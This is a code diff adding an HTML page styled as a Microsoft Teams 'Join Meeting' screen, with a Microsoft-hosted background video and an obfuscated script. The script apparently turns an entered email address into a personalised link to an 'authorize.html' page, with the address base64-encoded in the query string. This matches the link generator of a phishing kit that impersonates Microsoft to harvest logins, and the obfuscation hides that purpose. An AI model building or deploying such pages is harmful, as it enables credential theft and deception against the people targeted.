@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Teams Meeting</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC4AAAAuCAYAAABXuSs3AAAGZUlEQVRoQ+2Ye2wURRzHf7N7e9eT9ih9HBhoKa0YjBhDaOkhkhhFIjSEAhJBTRRREowoGI1IKbloH4aQCBiNBFD+QApGaUuCBgP+4QPbUjBGDYhGyivQXsWGXu1d73bH39xzb1+37a01JCw5cp2bx2e+8/39ZnYI3KIPuUW54Tb4aK/cbcXlinu9PdkhG3kaKJQTEQqpDU5LlHY21rq/sGplLFd889u9SynQnQg4UQlJgexoqC1YbwW8peA1dTceBCp+y8AofjQ7J/Bh/ebCtZnCWwzuO4PEM5RQEhZwscLIhAhZWr+5oFlZr2pF+1wbSOUccIOEktOHD806pTdBy8DfbOidxon0rK6SMnq00vsNte6X4nXXrOkUevziPpz0k/EyNlFK4N3mA5WvavVpGXhNne8pHHi/OQvQtvpa9+x43eoV7R+gr9YyGLYi8odS+nrrQc82Zb/WgW/pXgICd9gUOIET6PN5rO7y5SfzQjb+L/12Yk9L0wPj/zPw9RvPlqBeF+QDsOXmeAc4snJSQ5XC1vothW+wuo8/0TY/zJFj7DurzxylfCglxa0HZ12Wl6sUX7DseDVPSBUukU1bBR6LRdlPyb95PvgYAXECW3DBFoTc3AIYk10IWc5xYLM5Em0oBzMbagrPsIJlK09Oo8CflXTTENCWpsp4bCf6SAFftOzYNAk7MbXcaSpROghS6Fcom/oIwo8HQXBGWmBgbsLAbJQ3r17Z/jP+PV2rS6x/pLXJs9jQKkxtnJoqTQ17IjH1woFTUDS5EvIK7gLB4RwgEn2lrta9V9nfkuXtD+P6nlB7BLrRPJ6Wg7O7RgQuz8PDmQQN/dQ4qXgG73KVfiNk53c0bsrx6bVnlhGJzcuOCahyAK3QGSJDG44emPu3VpsUq2gpvriqCF5YdXekrdEEXn6tA/7s6k8Z4+jn8yzLWsNWXA5upLYWOA392DupqCKYm18WFuzOlBQtiVKOKEpjA4FgsLvnRl8wOBRK6T+Z1Hux4a7Wpso98t8NFWcjlZXkwJSS7ESb1c9MBVeOAG0dPvgBP7GIg+/beyAQYGuS5Et4PL8Ms8wdyX1focDNmwNw5Uq3avOJV0PIkEC4hZ8eqDguK0v2krSKXkYF2LltFpTiZFqPXobdH583WAQC4UAHBqcH8vJLgbc7cXNk/9QPKg/nflPFX2pFKq3CIN2XBlyfRw9cy/9JxaeCYM/SSBrRE6QaPClc/BuH4IfNgWudHBSKf4SKE+16jDKE6bCYpUNmFTtaRefJXPFFmMftRnmcoFUq0PM5cCStVQCtcgomI7gLwR0KcPkKiaKIVrloFPsYOmasor/9DsPjUfDIBiRXnPXNPrJNXK64bnSZAjeYe8TjxRicX6YLTg1wlBnPKRFfRxWPKiQHjxpPQ7mMwHG0CHipmayio/joZBX1wjHwqMcvYjr8w9CXmlYxAo8Np2mXjBTHQc3ncWPFE2bAL6IUzeN6/o6UZwqeFEw5jPKcbgwe9Xj0fzPpEE+W1c2HPK3pNyDFjmKQaGSLnzqZyM5ZhDtnoTqPp6ZDEzunwz6uZd+MPk3wqiXHpuO7FjvUp3n0jwTxhmK4H2j4XPI8HnuRSOk4Rh8KheH875eMxuzEt6AKeQXV0WHh0q+eJ4Sbk9qLTJ8YM5X89w0Fb8yM1lNu+CIMBa6C0+mAotI5+Ao3WbUByfsfGBiErovX9MD9ROJmNx+q+MUQPJ3W8d/nL3pnwT/9vpS7wPjmjxc+kJXliryy3TnxfnC5JoJNUJ9V4um6r68frl7Hk6b6TZlZYxWq3aLkGvFBn13i9A9d8IEkjk1ctmkcW/IKymBsbhEeaVTvuwkWv39w16VL1/IxjsojhRTCOItPcPbb5b62RHHWyXMvfr2HikOr9Q7aPC+Ae8K97MpN21FYivcF17NE2z1e77hE4JlZ9RErzjpft65tkm1M7mkEc6uWEhW227Mx1iO3K/rvfRQ24B3LdjOwlinOOqqpu+4ByrMb2tR7GHNv2N8Jov9Rr3dKYNTB2YCb3up5FlXfzeDN5fsIJkLTBV6v2z9caFY/I6vIB6zx+sqBJ+9hZHnSgITR9PuFsLRupNCWgsdhmfoc4Rbj0fQhLMtNTIKQLrCRz0IB2LHVm39lJCpb6nEjgI3eayUS2MNWgKqCP9OZ/1/tLfP4aE/gNvhoK/4vS9C0TVqiVcYAAAAASUVORK5CYII=" type="image/x-icon">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            padding: 1rem;
+            box-sizing: border-box;
+        }
+        video {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: -1;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2rem 1.5rem;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            box-sizing: border-box;
+        }
+        h1 { font-size: 1.5rem; margin-bottom: 1.5rem; color: #333; }
+        input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            outline: none;
+            font-size: 1rem;
+        }
+        input[type="email"]:focus {
+            border-color: #5864A6;
+            box-shadow: 0 0 0 2px rgba(88, 100, 166, 0.2);
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #5864A6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+        button:hover { background-color: #4a5594; }
+        #linkArea {
+            margin-top: 1.5rem;
+            padding: 12px;
+            background: #e9ecef;
+            border-radius: 8px;
+            word-break: break-all;
+            display: none;
+        }
+        #linkArea a { color: #007bff; text-decoration: none; font-weight: bold; }
+        #linkArea a:hover { text-decoration: underline; }
+        .logo{
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem 1rem;
+            }
+            h1 {
+                font-size: 1.3rem;
+            }
+            .logo {
+                width: 70px;
+                height: 70px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <video playsinline="" autoplay="" muted="" loop="" poster="">
+                 <source src="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k" type="video/webm"> <source src="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k" type="video/mp4"> </video>
+    <div class="container">
+        <img class="logo" src="img/logo.png" alt="">
+        <h1>Generate Your Link</h1>
+        <input type="email" id="user" name="user" placeholder="Enter email address" required>
+        <button id="generateBtn">Generate link</button>
+        <div id="linkArea">
+            <p>Your Link:</p>
+            <a id="generatedLink" href="#" target="_blank"></a>
+        </div>
+    </div>
+
+    <script>
+        function _0x14d6(){const _0x44e18d=['er\x20a\x20valid','Uezzj','Please\x20ent','3810222loOEQf','lastIndexO','1002138JvxkDo','includes','ress.','html?','click','JuGty','fxpcn','text','SNrLh','ezkbJ','4LHQJrX','XRKNi','wckBf','location','1218889MZWmyX','10639070cBOyif','href','Link','OHlFC','2927yCoHPM','11aAjhuG','attr','ready','ZXpXl','1223814cuXZNa','8FaTGkA','otUTP','#user','authorize.','#linkArea','substring','val','15HsdYVq','ADive','29978556wdNslB','BhKrb','fadeIn','\x20email\x20add','#generated','#generateB','user=','490ZvgiDt','eFHsF','ZXLRP'];_0x14d6=function(){return _0x44e18d;};return _0x14d6();}const _0x1f8703=_0x23c0;function _0x23c0(_0x408c93,_0x7cccac){_0x408c93=_0x408c93-(-0x20ef+-0xf69+-0x6d*-0x75);const _0x2bb625=_0x14d6();let _0x5ab062=_0x2bb625[_0x408c93];return _0x5ab062;}(function(_0x1ceeeb,_0x10da77){const _0x5e3bc2=_0x23c0,_0x300c7d=_0x1ceeeb();while(!![]){try{const _0x4c6ebc=-parseInt(_0x5e3bc2(0x18b))/(0x3*0xbd9+0x2012+0x439c*-0x1)*(parseInt(_0x5e3bc2(0x1a1))/(0x8b8+-0x2275*-0x1+0x2b*-0x101))+-parseInt(_0x5e3bc2(0x190))/(-0x1*0x233e+0x1*-0x2bb+-0x44*-0x8f)*(parseInt(_0x5e3bc2(0x182))/(0x1*-0x16ff+0x1*0x230c+-0xc09))+parseInt(_0x5e3bc2(0x198))/(0x73*-0x25+0xd1d*-0x1+0x1dc1)*(parseInt(_0x5e3bc2(0x1a9))/(-0x26c3*-0x1+0x1*0x11d9+-0x3896))+parseInt(_0x5e3bc2(0x186))/(0x749+-0x64d*-0x4+0xa*-0x33f)*(parseInt(_0x5e3bc2(0x191))/(-0x1*-0x359+-0x11*0xde+0xb6d))+-parseInt(_0x5e3bc2(0x1a7))/(0x1659*0x1+0xfc3+-0x39*0xab)+-parseInt(_0x5e3bc2(0x187))/(-0x9c6+-0x139e+0x1d6e)+parseInt(_0x5e3bc2(0x18c))/(0x1487+-0x25a2+0x1126)*(parseInt(_0x5e3bc2(0x19a))/(0x25d7+0x3b5+-0x20*0x14c));if(_0x4c6ebc===_0x10da77)break;else _0x300c7d['push'](_0x300c7d['shift']());}catch(_0x295438){_0x300c7d['push'](_0x300c7d['shift']());}}}(_0x14d6,0x4*-0x152c6+0xd1fbe+0xbb1d),$(document)[_0x1f8703(0x18e)](function(){const _0x308af1=_0x1f8703,_0x2d36e1={'wckBf':function(_0x333581,_0x575f24){return _0x333581(_0x575f24);},'ZXpXl':_0x308af1(0x193),'ezkbJ':function(_0xf61860,_0x3fbb5a){return _0xf61860+_0x3fbb5a;},'XRKNi':_0x308af1(0x1a0),'eFHsF':function(_0x599372,_0xf1117d){return _0x599372+_0xf1117d;},'ADive':function(_0x4e6e89,_0xa23fc3){return _0x4e6e89+_0xa23fc3;},'fxpcn':_0x308af1(0x194)+_0x308af1(0x17b),'ZXLRP':function(_0x453e2e,_0x4994db){return _0x453e2e(_0x4994db);},'otUTP':_0x308af1(0x19e)+_0x308af1(0x189),'SNrLh':_0x308af1(0x188),'BhKrb':_0x308af1(0x195),'Uezzj':_0x308af1(0x1a6)+_0x308af1(0x1a4)+_0x308af1(0x19d)+_0x308af1(0x17a),'OHlFC':_0x308af1(0x19f)+'tn','JuGty':_0x308af1(0x17c)};_0x2d36e1[_0x308af1(0x184)]($,_0x2d36e1[_0x308af1(0x18a)])['on'](_0x2d36e1[_0x308af1(0x17d)],function(){const _0x17053a=_0x308af1,_0x4f8c52=_0x2d36e1[_0x17053a(0x184)]($,_0x2d36e1[_0x17053a(0x18f)])[_0x17053a(0x197)]();if(_0x4f8c52&&_0x4f8c52[_0x17053a(0x179)]('@')){const _0x545ddd=_0x2d36e1[_0x17053a(0x181)](_0x2d36e1[_0x17053a(0x183)],_0x4f8c52),_0x3149e6=_0x2d36e1[_0x17053a(0x184)](btoa,_0x545ddd),_0x1dfe7c=window[_0x17053a(0x185)][_0x17053a(0x188)][_0x17053a(0x196)](-0x3f5*-0x1+-0x1*0x2479+0x2084*0x1,_0x2d36e1[_0x17053a(0x1a2)](window[_0x17053a(0x185)][_0x17053a(0x188)][_0x17053a(0x1a8)+'f']('/'),-0xbfd*-0x1+0x7*-0x44+0x20*-0x51)),_0x594f17=_0x2d36e1[_0x17053a(0x1a2)](_0x2d36e1[_0x17053a(0x199)](_0x1dfe7c,_0x2d36e1[_0x17053a(0x17e)]),_0x3149e6);_0x2d36e1[_0x17053a(0x1a3)]($,_0x2d36e1[_0x17053a(0x192)])[_0x17053a(0x18d)](_0x2d36e1[_0x17053a(0x180)],_0x594f17)[_0x17053a(0x17f)](_0x594f17),_0x2d36e1[_0x17053a(0x184)]($,_0x2d36e1[_0x17053a(0x19b)])[_0x17053a(0x19c)]();}else _0x2d36e1[_0x17053a(0x1a3)](alert,_0x2d36e1[_0x17053a(0x1a5)]);});}));
+    </script>
+</body>
+</html>
